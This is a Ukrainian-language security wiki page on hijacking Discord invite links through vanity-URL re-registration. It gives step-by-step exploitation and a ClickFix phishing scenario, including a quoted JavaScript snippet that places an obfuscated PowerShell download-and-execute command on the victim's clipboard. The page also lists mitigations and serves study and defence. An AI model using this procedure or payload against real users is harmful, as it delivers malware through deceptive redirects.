# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord Invite Hijacking зловживає правилами повторного використання custom vanity links: прострочений код тимчасового запрошення або видалений постійний код, що складається лише з малих літер і цифр, може бути зареєстрований як vanity-посилання на сервері з Level 3 Boost. Custom vanity link також може стати доступним, якщо початковий сервер втратить свій Level 3 Boost; для тимчасового запрошення з великими літерами атакер може заздалегідь зареєструвати форму vanity у нижньому регістрі, поки звичайне запрошення залишається активним, але перенаправлення почнеться лише після завершення терміну дії цього запрошення.<sup>[[1]](#references)[[2]](#references)</sup>

## Типи запрошень і ризик перехоплення

Виявлений ризик відрізняється залежно від типу запрошення:<sup>[[1]](#references)[[2]](#references)</sup>

| Тип запрошення           | Чи можна перехопити? | Умова / Коментарі                                                                                       |
|--------------------------|----------------------|-----------------------------------------------------------------------------------------------------------|
| Тимчасове запрошення     | ✅                   | Після завершення терміну дії код стає доступним і може бути повторно зареєстрований як vanity URL boosted-сервером. |
| Постійне запрошення       | ⚠️                   | Якщо код видалено і він складається лише з малих літер і цифр, він може знову стати доступним.             |
| Custom Vanity Link        | ✅                   | Якщо початковий сервер втратить свій Level 3 Boost, його vanity invite стане доступним для нової реєстрації. |

## Етапи експлуатації

1. Розвідка
- Відстежуйте публічні джерела (форумі, соціальні мережі, Telegram-канали) у пошуках invite links, що відповідають шаблону `discord.gg/{code}` або `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Збирайте цікаві invite codes (тимчасові або vanity).<sup>[[1]](#references)</sup>
2. Попередня реєстрація
- Створіть або використайте наявний Discord server із привілеями Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- У **Server Settings → Vanity URL** спробуйте призначити цільовий invite code. Якщо його прийнято, код резервується malicious server.<sup>[[1]](#references)</sup>
3. Активація перехоплення
- Для тимчасових запрошень дочекайтеся завершення терміну дії оригінального запрошення (або видаліть його вручну, якщо контролюєте джерело).<sup>[[1]](#references)</sup>
- Для кодів, що містять великі літери, варіант у нижньому регістрі можна отримати негайно, хоча перенаправлення активується лише після завершення терміну дії.<sup>[[1]](#references)</sup>
4. Непомітне перенаправлення
- Користувачі, які переходять за старим посиланням, безперешкодно потрапляють на сервер під контролем атакера після активації перехоплення.<sup>[[1]](#references)</sup>

## Фішинговий сценарій через Discord Server

1. Обмежте канали сервера так, щоб був видимим лише канал **#verify**.<sup>[[1]](#references)</sup>
2. Розгорніть bot (наприклад, **Safeguard#0786**), щоб він пропонував новим користувачам пройти verification через OAuth2.<sup>[[1]](#references)</sup>
3. Bot перенаправляє користувачів на phishing site (наприклад, `captchaguard.me`) під виглядом CAPTCHA або етапу verification.<sup>[[1]](#references)</sup>
4. Реалізуйте UX-трюк **ClickFix**:<sup>[[1]](#references)</sup>
- Відобразіть повідомлення про несправну CAPTCHA.
- Запропонуйте користувачам відкрити діалог **Win+R**, вставити попередньо завантажену PowerShell-команду та натиснути Enter.

### Приклад інʼєкції в буфер обміну через ClickFix

Кампанія використовувала JavaScript для копіювання malicious PowerShell-команди в буфер обміну:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Цей підхід уникає прямого завантаження файлів і використовує знайомі елементи UI, щоб зменшити підозри користувачів.<sup>[[1]](#references)</sup>

## Mitigations

- Надавайте перевагу постійним invite links і переконайтеся, що код містить принаймні одну велику літеру; видалені постійні коди, що містять великі літери, не можна повторно використовувати як vanity links.<sup>[[1]](#references)</sup>
- Регулярно змінюйте invite codes і відкликайте старі links.
- Відстежуйте boost status Discord server і заявки на vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Навчайте користувачів перевіряти автентичність server і не виконувати команди, вставлені з clipboard.

## References

- [1] [Від довіри до загрози: викрадені Discord invites використовуються для доставки malware у кілька етапів](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Підтримка Discord](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
